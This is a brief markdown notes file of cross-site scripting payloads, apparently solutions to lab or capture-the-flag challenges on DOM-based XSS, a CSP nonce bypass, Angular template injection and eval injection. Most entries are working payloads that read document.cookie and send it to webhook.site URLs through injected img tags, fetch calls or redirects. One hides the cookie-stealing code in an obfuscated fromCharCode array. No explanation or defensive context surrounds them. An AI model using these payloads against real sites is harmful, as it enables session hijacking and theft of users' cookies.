# xss dom based intro
```
'; document.write(String.fromCharCode(60) + 'img src = "https://webhook.site/0eff22c5-4adb-4ea3-b7fe-84459244a30b?' + 'cookie='+ document.cookie + '"'+ String.fromCharCode(62)); var test = '
```
# CSP nonce 2
```
connect-src 'none'; font-src 'self'; frame-src 'none'; img-src 'self'; manifest-src 'none'; media-src 'none'; object-src 'none'; script-src 'nonce-c5199b57c55ed8930fe4ad2c8e847b04'; style-src 'self'; worker-src 'none'; frame-ancestors 'none'; block-all-mixed-content;
```
```
&lt;Svg OnLoad=alert(domain)>
```
```
&lt;script nonce="c5199b57c55ed8930fe4ad2c8e847b04"> alert(1) </script>
```
# xss dom based Angular
```
document.write(String.fromCharCode(60) + 'img src = "https://webhook.site/0eff22c5-4adb-4ea3-b7fe-84459244a30b?' + 'cookie='+ document.cookie + '"'+ String.fromCharCode(62))
```

```
{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
```

```
{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,54,48,41,32,43,32,39,105,109,103,32,115,114,99,32,61,32,34,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,48,101,102,102,50,50,99,53,45,52,97,100,98,45,52,101,97,51,45,98,55,102,101,45,56,52,52,53,57,50,52,52,97,51,48,98,63,39,32,43,32,39,99,111,111,107,105,101,61,39,43,32,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,32,43,32,39,34,39,43,32,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,54,50,41,41))()}}
```

## xss dom based - eval
```
1+1`${alert`document.cookie`}`
```
```
1+1`${fetch`"https://webhook.site/4a2a444c-5137-446c-8548-003c2048979d?cookie=" + document.cookie`}`
```
```
1+1`${document.location="https://webhook.site/4a2a444c-5137-446c-8548-003c2048979d?c="+document.cookie}\`
```